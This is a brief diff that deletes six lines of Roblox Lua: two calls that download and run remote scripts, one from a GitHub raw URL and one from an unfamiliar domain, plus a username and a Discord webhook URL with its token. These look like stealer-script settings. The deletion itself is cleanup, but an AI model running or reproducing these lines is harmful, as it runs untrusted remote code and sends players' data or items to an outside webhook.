@@ -1,6 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Mc4121ban/trashscript/main/chaotic.lua"))()
-
-Username = "owhvdjygshistbwjdh"
-Webhook = "https://discord.com/api/webhooks/1276526149635145799/6fFv6HtxwAexc9F1wFoHrP-LDnE-pvYkFHh-SDNe3uUQWfS4sgLkKKgBrzUCE2fqrEQU"
-
-loadstring(game:HttpGet("https://egorikusa.space"))()
